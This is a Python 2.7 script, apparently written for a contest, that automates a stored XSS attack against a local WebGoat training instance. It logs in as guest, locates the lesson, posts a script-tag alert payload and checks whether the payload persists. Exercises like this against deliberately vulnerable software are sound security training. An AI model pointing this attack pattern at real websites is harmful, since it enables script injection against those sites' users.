#Python2.7
import requests
import argparse
import json
import re
import sys

def webgoat_stored_xss_attacks():
	#start session
	session = requests.Session()
	#Webgoat login page get
	host = '127.0.0.1'
	port = '8082'
	webgoat_main_address = 'http://' + host + ':' + port + '/WebGoat/'
	webgoat_session = session.get( webgoat_main_address +'login.mvc' )
	lesson_name = "Stored XSS Attacks"

	try:
		#session token store
		cookie = webgoat_session.cookies

		login_parameters = {'username': 'guest', 'password': 'guest'}
		#login to access content
		login = session.post( webgoat_main_address + 'j_spring_security_check;jsessionid=' + str( cookie['JSESSIONID'] ), login_parameters )

		#access all lessons json and finding lesson api address by lesson name 
		#we could use direct link to lesson but thats just different approach
		webgoat_lesson_api = session.get( webgoat_main_address + 'service/lessonmenu.mvc' )
		webgoat_lesson_api_split = webgoat_lesson_api.text.split( '},{' )

		for i in webgoat_lesson_api_split:
			if lesson_name in i:
				lesson_api = i.split( "," )

		#prepare lesson address
		lesson_address = str( lesson_api[4].split( "\"" )[3] )
		lesson_parted_address = lesson_address[1:].split( '/' )
		lesson_prepared_api_address = lesson_parted_address[0] + '?Screen=' + lesson_parted_address[1] + '&menu=' + lesson_parted_address[2]

		#post xss
		xss = '<script language="javascript" type="text/javascript">alert("Goyello contest");</script>';
		input_data = {'title' : 'Check XSS Goyello Contest', 'message': xss, 'SUBMIT':'Submit'}
		end_result =  session.post(  webgoat_main_address + lesson_prepared_api_address, input_data )

		#Validation get address to post with xss 
		if input_data['title'] in end_result.text:
			split_end_result = end_result.text.split( '<a href=\'' )
			for i in split_end_result:
				if input_data['title'] in i:
					split_attack_result = i.split( "\' style=" )[0].split("Num=")[1]

		#check if xss is present in callback
		check_result = session.get( webgoat_main_address + lesson_prepared_api_address + "&stage=Num&Num=" + split_attack_result )
		if "</script>" in input_data['message']:
			if input_data['message'] in check_result.text:
				print 'Success xss vulnerability is still present'
			else:
				print 'Unfortunetaly it isn\'t working any more'
		else:
			print 'Unfortunetaly we couldn\'t check if xss was working'

	except Exception as e:
		print e

webgoat_stored_xss_attacks()